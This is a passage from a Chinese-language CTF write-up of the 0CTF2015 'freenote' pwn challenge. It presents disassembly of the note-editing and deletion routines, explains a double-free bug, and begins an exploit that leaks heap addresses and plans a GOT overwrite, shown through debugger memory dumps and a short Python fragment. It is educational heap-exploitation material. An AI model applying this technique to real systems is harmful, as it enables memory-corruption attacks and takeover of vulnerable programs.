| ||| 0x00400f14 4889d0 mov rax, rdx
| ||| 0x00400f17 4801c0 add rax, rax
; '#'
| ||| 0x00400f1a 4801d0 add rax, rdx
; '('
| ||| 0x00400f1d 48c1e003 shl rax, 3
| ||| 0x00400f21 4801f0 add rax, rsi
; '+'
| ||| 0x00400f24 4883c010 add rax, 0x10
| ||| 0x00400f28 48894808 mov qword [rax + 8],
rcx ; 将新的大小写回 Note 的 length
| ||| ; JMP XREF from 0x00400e6f (sub.Note_number:_d87)
| |`--> 0x00400f2c bf91124000 mov edi, str.Enter_yo
ur_note: ; 0x401291 ; "Enter your note: "
| | | 0x00400f31 b800000000 mov eax, 0
| | | 0x00400f36 e8a5f7ffff call sym.imp.printf
; int printf(const char *format)
| | | 0x00400f3b 488b0d661120. mov rcx, qword [0x006
987
6.1.7 pwn 0CTF2015 freenote
020a8] ; [0x6020a8:8]=0
| | | 0x00400f42 8b45e8 mov eax, dword [local
_18h]
| | | 0x00400f45 4863d0 movsxd rdx, eax
| | | 0x00400f48 4889d0 mov rax, rdx
| | | 0x00400f4b 4801c0 add rax, rax
; '#'
| | | 0x00400f4e 4801d0 add rax, rdx
; '('
| | | 0x00400f51 48c1e003 shl rax, 3
| | | 0x00400f55 4801c8 add rax, rcx
; '&'
| | | 0x00400f58 4883c020 add rax, 0x20
| | | 0x00400f5c 488b00 mov rax, qword [rax]
| | | 0x00400f5f 8b55e4 mov edx, dword [local
_1ch]
| | | 0x00400f62 89d6 mov esi, edx
| | | 0x00400f64 4889c7 mov rdi, rax
| | | 0x00400f67 e8f1f8ffff call sub.read_85d
; ssize_t read(int fildes, void *buf, size_t nbyte) ; 读入
新的笔记内容
| | | 0x00400f6c bfa3124000 mov edi, str.Done.
; 0x4012a3 ; "Done."
| | | 0x00400f71 e84af7ffff call sym.imp.puts
; int puts(const char *s)
| | | ; JMP XREF from 0x00400dfb (sub.Note_number:_d87)
| | | ; JMP XREF from 0x00400e2c (sub.Note_number:_d87)
| `-`-> 0x00400f76 4883c418 add rsp, 0x18
| 0x00400f7a 5b pop rbx
| 0x00400f7b 5d pop rbp
\ 0x00400f7c c3 ret
该函数在输入了笔记序号和大小之后，会先判断新的大小与现在的大小是否相同，
如果相同，则不重新分配空间，直接编辑其内容，否则调用 realloc() 重新分
配一块空间（地址可能与原地址相同，也可能不相同）。
Delete 的实现如下：
[0x00400770]> pdf @ sub.No_notes_yet._f7d
988
6.1.7 pwn 0CTF2015 freenote
/ (fcn) sub.No_notes_yet._f7d 266
| sub.No_notes_yet._f7d ();
| ; var int local_4h @ rbp-0x4
| ; var int local_0h @ rbp-0x0
| ; CALL XREF from 0x004010ec (main + 101)
| 0x00400f7d 55 push rbp
| 0x00400f7e 4889e5 mov rbp, rsp
| 0x00400f81 4883ec10 sub rsp, 0x10
| 0x00400f85 488b051c1120. mov rax, qword [0x006
020a8] ; [0x6020a8:8]=0
| 0x00400f8c 488b4008 mov rax, qword [rax +
8] ; [0x8:8]=-1 ; 8
| 0x00400f90 4885c0 test rax, rax
; 检查 Notes 成员 length 是否为零，即是否有笔记
| ,= 0x00400fd0 bfb7124000 mov edi, str.Invalid_
number ; 0x4012b7 ; "Invalid number!"
| | | 0x00400fd5 e8e6f6ffff call sym.imp.puts
989
6.1.7 pwn 0CTF2015 freenote
; int puts(const char *s)
| |,== 0x00400fdf 488b05c21020. mov rax, qword [0x006
020a8] ; [0x6020a8:8]=0
| || 0x00400fe6 488b5008 mov rdx, qword [rax +
8] ; [0x8:8]=-1 ; 8 ; 取出 Notes 成员 length
| || 0x00400fea 4883ea01 sub rdx, 1
; 将 length -1
| || 0x00400fee 48895008 mov qword [rax + 8],
rdx ; 将新的 length 写回去
| || 0x00400ff2 488b0daf1020. mov rcx, qword [0x006
020a8] ; [0x6020a8:8]=0
| || 0x00400ff9 8b45fc mov eax, dword [local
_4h]
| || 0x00400ffc 4863d0 movsxd rdx, eax
| || 0x00400fff 4889d0 mov rax, rdx
| || 0x00401002 4801c0 add rax, rax
; '#'
| || 0x00401005 4801d0 add rax, rdx
; '('
| || 0x00401008 48c1e003 shl rax, 3
| || 0x0040100c 4801c8 add rax, rcx
; '&'
| || 0x0040100f 4883c010 add rax, 0x10
| || 0x00401013 48c700000000. mov qword [rax], 0
; 修改 Note 成员 isValid 为 0
| || 0x0040101a 488b0d871020. mov rcx, qword [0x006
020a8] ; [0x6020a8:8]=0
| || 0x00401021 8b45fc mov eax, dword [local
_4h]
| || 0x00401024 4863d0 movsxd rdx, eax
| || 0x00401027 4889d0 mov rax, rdx
| || 0x0040102a 4801c0 add rax, rax
; '#'
| || 0x0040102d 4801d0 add rax, rdx
; '('
| || 0x00401030 48c1e003 shl rax, 3
| || 0x00401034 4801c8 add rax, rcx
; '&'
990
6.1.7 pwn 0CTF2015 freenote
| || 0x00401037 4883c010 add rax, 0x10
| || 0x0040103b 48c740080000. mov qword [rax + 8],
0 ; 修改 Note 成员 length 为 0
| || 0x00401043 488b0d5e1020. mov rcx, qword [0x006
020a8] ; [0x6020a8:8]=0
| || 0x0040104a 8b45fc mov eax, dword [local
_4h]
| || 0x0040104d 4863d0 movsxd rdx, eax
| || 0x00401050 4889d0 mov rax, rdx
| || 0x00401053 4801c0 add rax, rax
; '#'
| || 0x00401056 4801d0 add rax, rdx
; '('
| || 0x00401059 48c1e003 shl rax, 3
| || 0x0040105d 4801c8 add rax, rcx
; '&'
| || 0x00401060 4883c020 add rax, 0x20
| || 0x00401064 488b00 mov rax, qword [rax]
| || 0x00401067 4889c7 mov rdi, rax
; rdi 为 Note 成员 content 指向的地址
| || 0x0040106a e841f6ffff call sym.imp.free
; void free(void *ptr)
| || 0x0040106f bfa3124000 mov edi, str.Done.
; 0x4012a3 ; "Done."
| || 0x00401074 e847f6ffff call sym.imp.puts
; int puts(const char *s)
| ,=== 0x0040107b bfd8124000 mov edi, str.No_notes
_yet. ; 0x4012d8 ; "No notes yet."
| || 0x00401080 e83bf6ffff call sym.imp.puts
; int puts(const char *s)
| || ; JMP XREF from 0x00400fda (sub.No_notes_yet._f7d)
| || ; JMP XREF from 0x00401079 (sub.No_notes_yet._f7d)
| ``--> 0x00401085 c9 leave
\ 0x00401086 c3 ret
991
6.1.7 pwn 0CTF2015 freenote
该函数在读入要删除的笔记序号后，首先将 Notes 结构体成员 length -1 ，然后
将对应的 Note 结构体的 isValid 和 length 修改为 0 ，然后 free 掉笔记的
内容（ *content ）。
漏洞利用
在上面逆向的过程中我们发现，程序存在 double free 漏洞。在 Delete 的时候，只
是设置了 isValid =0 作为标记，而没有将该笔记从 Notes 中移除，也没有将
content 设置为 NULL，然后就调用了 free 函数。整个过程没有对 isValid
是否已经为 0 做任何检查。于是我们可以对同一个笔记 Delete 两次，造成
double free，修改 GOT 表，改变程序的执行流。
泄漏地址
第一步先泄漏堆地址。为方便调试，就先关掉 ASLR 吧：
gef➤ vmmap heap
Start End Offset Perm Pa
th
0x0000000000603000 0x0000000000625000 0x0000000000000000 rw- [he
ap]
gef➤ vmmap libc
Start End Offset Perm Pa
th
0x00007ffff7a15000 0x00007ffff7bd0000 0x0000000000000000 r-x /ho
me/firmy/libc-2.19.so
0x00007ffff7bd0000 0x00007ffff7dcf000 0x00000000001bb000 --- /ho
me/firmy/libc-2.19.so
0x00007ffff7dcf000 0x00007ffff7dd3000 0x00000000001ba000 r-- /ho
me/firmy/libc-2.19.so
0x00007ffff7dd3000 0x00007ffff7dd5000 0x00000000001be000 rw- /ho
me/firmy/libc-2.19.so
为了泄漏堆地址，我们需要释放 2 个不相邻且不会被合并进 top chunk 里的
chunk，所以我们创建 4 个笔记，可以看到由初始化阶段创建的 Notes 和 Note 结
构体：
992
6.1.7 pwn 0CTF2015 freenote
for i in range(4):
newnote("A"*8)
gef➤ x/16gx 0x00603000
0x603000: 0x0000000000000000 0x0000000000001821
0x603010: 0x0000000000000100 0x0000000000000004 m
ain_arena+88 chunk 2
gef➤ x/4gx 0x00603000+0x1820+0x90*1
0x6048b0: 0x0000000000000090 0x0000000000000090 c
hunk 0 main_arena+88
gef➤ x/4gx 0x00603000+0x1820+0x90*3
0x6049d0: 0x0000000000000090 0x0000000000000090 <-- chunk
3
0x6049e0: 0x4141414141414141 0x0000000000000000
gef➤ x/4gx 0x00603000+0x1820+0x90*4
0x604a60: 0x0000000000000000 0x00000000000205a1 <-- top c
hunk